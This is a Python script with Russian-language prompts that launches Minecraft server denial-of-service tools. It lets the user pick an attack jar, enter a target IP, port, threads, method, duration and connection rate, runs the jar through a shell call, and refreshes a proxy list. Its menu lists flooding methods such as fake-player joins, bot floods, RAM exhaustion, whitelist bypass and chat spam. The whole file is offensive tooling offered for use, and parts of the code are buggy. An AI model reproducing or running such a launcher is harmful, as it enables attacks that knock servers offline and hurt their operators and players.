import os as s
import requests as req
import funcion as fun
import sys
apimc = 'https://api.mcsrvstat.us/2/'
api2ip = ''
jar = ''
jar1 = 'MCBOT.jar'
jar2 = 'KingDoS.jar'
jar3 = 'McStorm2.jar'
jar4 = 'botter.jar'
jar5 = 'java.jar'
alljarlist = [jar1,jar2,jar3,jar4,jar5]
name=''
name1='MCBOT'
name2='KingDoS'
name3='McStorm'
name4='botter'
name5='Raffic'
allnamelist = [name1,name2,name3,name4,name5]
command=['start','protocol','methods','updateproxy','switch']
jaren = 0
def clearcmd():
	s.system(f'cls')
def ddoson(*, ip:str, protocol:int, methods:str, second:int, cps:int):
	s.system(f'java -jar {jar} {ip} {protocol} {methods} {second} {cps}')
def McBot():
	ip = input(f'ip для DDoS >> ')
	port = str(input(f'Если порт не указан напишите None >> '))
	if port == 'None':
		port = 25565
	else:
		port = int(port)
	thre = input(f'Сколько потоков использовать >> ')
	s.system(f'java -jar {jar} {ip} {port} {thre}')
def fixprint(text):
	print(f'{text}')
def updateproxy():
	with open('proxies.txt', 'w') as file:
		file.write('')
	for i in range(len(site)):
		get = req.get(site[i])
		with open('proxies.txt', 'r') as file:
			saveproxy = file.read()
			file.close()
		with open('proxies.txt', 'w') as file:
			file.write(f'{saveproxy}\n{get.text}')
			file.close()

    #print(f'прокси были обновлены')
if __name__ == '__main__':
	fun.updateproxy()
	print('1. MCBOT \n2. KingDoS \n3. McStorm \n4. botter \n5. Raffic')
	jarinput = str(input(f'Какой jar файл хочете использовать >> '))
	if jarinput == '1':
		name=name1
		jar = jar1
	if jarinput == '2':
		name=name2
		jar = jar2
	if jarinput == '3':
		name=name3
		jar = jar3
	if jarinput == '4':
		name=name4
		jar = jar4
	if jarinput == '5':
		name=name5
		jar = jar5
	while jarinput != '1':
		print(f'Вы используйте {name}')
		z = input('Для ddos пропишите start\nЕсли хотите посмотреть протоколы protocol,methods для методов\nДля смены напишите switch\nВедите что вам надо >> ')
		if z != command:
			print(f'Я не понел вашу комманду')
		if z == 'start':
			ip = input('ip для DDoS >> ')
			protocol = input('protocol для DDoS >> ')
			methods = input('methods для DDoS >> ')
			second = input('second для DDoS >> ')
			cps = input('cps для DDoS >> ')
			ddoson(ip=ip,protocol=protocol,methods=methods,second=second,cps=cps)
		if z == 'protocol':
			print(f'1.18.2: 758, 1.18.1: 757, 1.18: 757, \n 1.17.1: 756, 1.16.5: 754, 1.16.3: 753,\n 1.16.2: 751, 1.16.1: 736, 1.16: 735,\n 1.15.2: 578, 1.15.1: 575, 1.15: 573,\n 1.14.4: 498, 1.14.3: 490, 1.14.2: 485,\n 1.14.1: 480, 1.14: 477, 1.13.2: 404,\n 1.13.1: 401, 1.13: 393, 1.12.2: 340')
		if z == 'methods':
			print(f'ram - нагрузка памети')
			print(f'join - заходят фейк игроки')
			print(f'botjoiner - заходят боты')
			print(f'ping - у игроков ping 0')
			print(f'bigpacket - много пакетов')
			print(f'nettydowner - пытается пробить whitelist или bungecord')
			print(f'spamjoin - боты заходят на сервер и пишут в чат')
		if z == 'switch':
			clearcmd()
			print('Вызываю режим переключение')
			fun.switch()
	while jarinput == '1':
		print(f'Вы используйте {name}')
		z = input('Для ddos пропишите start >> ')
		if z == 'start':
			McBot()
		if z == 'switch':
			clearcmd()
			print('Вызываю режим переключение')
			fun.switch()
